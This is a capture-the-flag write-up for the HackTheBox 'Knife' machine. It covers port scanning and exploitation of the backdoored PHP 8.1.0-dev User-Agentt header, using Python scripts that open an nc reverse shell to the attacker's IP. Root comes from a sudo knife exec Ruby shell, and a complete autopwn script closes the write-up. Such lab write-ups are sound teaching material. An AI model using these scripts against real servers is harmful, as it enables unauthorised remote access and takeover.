## Enumeration
---

### Nmap

First, we will start scanning the target machine. To do this, we will use [nmap](https://github.com/nmap/nmap). The scan will filter the open ports in all the port range and will use the TCP Syn Port Scan. Optionally, we can disable host discovery and DNS resolution to make the scan faster. Last but not least, we export evidence to a file called `allPorts`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.242
```

```text
# Nmap 7.91 scan initiated Wed Jun 16 22:08:18 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.242
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.242 ()	Status: Up
Host: 10.10.10.242 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Wed Jun 16 22:08:29 2021 -- 1 IP address (1 host up) scanned in 11.69 seconds
```
{: .file="enum/allPorts"}

Once we know the open ports, we can now do a more exhaustive scan to detect the services running on them and their versions. We will also save evidence in a file called `targeted`:

```bash
nmap -sC -sV -p22,80 -oN targeted 10.10.10.242
```

```text
# Nmap 7.91 scan initiated Wed Jun 16 22:09:14 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.040s latency).

```
{: .file="enum/targeted"}

We can see how that ports are open: 22 (SSH) and 80 (HTTP).

### WhatWeb

We will start by enumerating the web server. With the [WhatWeb](https://github.com/urbanadventurer/WhatWeb) tool, we can make a first approximation of what technologies the web server is running. To use it:

```bash
whatweb "http://10.10.10.242"
```

```text
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.42 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
{: .file="enum/whatWeb"}

We can see how the tool displays useful information. First, the server runs `Apache 2.4.1` and second, and more importantly, the `PHP` version that is running is the `8.1.0-dev`. This will attract our attention as the `PHP` version seems to be the `dev` version. We will explore more about this.

## User Shell

### Enumeration

We will try to search if the `PHP` version that the web server is running is vulnerable. To do this, we will use the [Searchsploit](https://github.com/offensive-security/exploitdb) tool that allows us to search in the known [Exploit-DB](https://www.exploit-db.com/) from the command line interface:

```bash
searchsploit php 8.1.0-dev
```

![Desktop View](user1.png){: w="700" h="400" }
_searchsploit_

If we analyze this RCE (Remote Command Execution) exploit, we can see how this particular version of `PHP` was compromised and a backdoor was introduced in the code. The only thing to do in order to exploit the vulnerability is to use the following header in an HTTP request and indicate the system-level command that we want to run:

```text
User-Agentt: zerdoiumsystem(whoami);
```

### Exploiting

To weaponize this exploit we will create a `Python3` script. This script will let us send a reverse shell from the target machine to our machine:

```python
#!/usr/bin/python3
#coding: utf-8


# PHP 8.0.1-dev Backdoor
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import sys


s = requests.Session() 


def main():
	r = s.get(sys.argv[1], headers={"User-Agentt":"zerodiumsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.175 443 >/tmp/f\");"})


if __name__ == "__main__":
	if(len(sys.argv)==2):
		main()
	else:
		print("Use: " + sys.argv[0] + " <http://test>")
```
{: .file="exploits/php-8.0.1-dev_backdoor.py"}

Before running the exploit, we will be listening for the reverse shell with `netcat` in our machine:

```bash
nc -nlvp 443
```

After executing the exploit:

![Desktop View](user2.png){: w="700" h="400" }
_Reverse Shell_

We can see how we have got a shell as the `james` user. We will proceed to visualize the `flag.txt` in the `/home/james`{: .filepath} directory.

## Root Shell

### Enumeration

Now we have a shell as the `james` user, so we will start to enumerate the target machine in order to escalate privileges.

The first thing we will do is to check `sudo` permissions for our current user `james`. To do this:

![Desktop View](root1.png){: w="700" h="400" }
_Sudo Privileges_

We can see how we have got the ability to execute the `/usr/bin/knife`{: .filepath} binary as `root` and without providing the password.

### Knife Binary

We will inspect this binary further in order to try to escalate our privileges to the `root` account.

First, we will see the help panel from the binary:

![Desktop View](root2.png){: w="700" h="400" }
_Knife Binary_

We can see how the help panel has 375 lines, meaning is huge. We will have to analyze this help panel patiently.

The following command will attract our attention, as it seems we can execute a script:

![Desktop View](root3.png){: w="700" h="400" }
_Knife Exec Help_

The only problem is that we don't know what type of script we have to provide. We will explore the [documentation](https://docs.chef.io/workstation/knife_exec/) of the utility:

![Desktop View](root4.png){: w="700" h="400" }
_Knife Docs_

Now we know that the program is expecting a `Ruby` script, we will use the following script to spawn a shell:

```ruby
#!/usr/bin/ruby -w

system("/bin/bash")
```
{: .file="exploits/knifeShell.rb"}

The last thing will be executing the `Knife` tool as `sudo` and specifying the path to the `Ruby` script that we have just created:

![Desktop View](root5.png){: w="700" h="400" }
_whoami root_

We can see how we have a shell as the `root` user, so we will proceed to visualize the `root.txt` flag in the `root`{: .filepath} directory.

## AutoPwn

As we have seen, the foothold and the privilege escalation of this machine have been very straightforward. That is why we have decided to do a script in `Python` that automates the whole process:

```python
#!/usr/bin/python3
#coding: utf-8


# Knife Machine Autopwn
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import sys
import threading
import time


from pwn import *


# Variables globales
lport = 443


# Sesion HTTP
s = requests.Session()


# Barras de progreso
p1 = log.progress("RCE")
p2 = log.progress("Reverse Shell")


# Ctrl C
def handler(signal,frame):
	log.failure("Saliendo...")
	sys.exit(1)


signal.signal(signal.SIGINT,handler)


# Intrusion
def obtainShell():
	try:
		p1.status("Enviando...")
		time.sleep(1)
		
		# Exploit
		header_data= {
			"User-Agentt":"zerodiumsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f\");" % (sys.argv[2],lport)
		}


		r = s.get(sys.argv[1], headers=header_data)


		p1.success("Enviada")
		time.sleep(1)
	except:
		log.failure("Ha ocurrido un error!")
		sys.exit(1)




# Main
if __name__ == "__main__":
	# Comprobacion argv
	if(len(sys.argv)==3):
		try:
			threading.Thread(target = obtainShell).start()
		except Exception as e:
			log.error(str(e))


		p2.status("Esperando conexion...")


		# Listener
		shell = listen(lport,timeout=20).wait_for_connection()


		# Connection checker
		if shell.sock is None:
			log.failure("No se ha obtenido ninguna conexion!")
			sys.exit(1)
		else:
			p2.success("Conexion obtenida")
			time.sleep(1)


			# Nos situamos en el directorio de trabajo
			shell.sendline(b'cd /tmp')
			
			# Escalada de privilegios
			payload = b'''echo -e "#\!/usr/bin/ruby -w\n\nsystem('/bin/bash')" > k.rb'''
			shell.sendline(payload)


			execute_payload = b'sudo /usr/bin/knife exec k.rb'
			shell.sendline(execute_payload)


			# Interactive shell
			shell.interactive()
	
	else:
		# Usage
		print("Usage: " + sys.argv[0] + " <http://RHOST>" + " <LHOST>")
```
{: .file="exploits/autopwn.py"}

![Desktop View](autopwn.png){: w="700" h="400" }
_Autopwn Working_

We can see how running the script, indicating the `RHOST` and the `LHOST`, we obtain a shell as the `root` user.
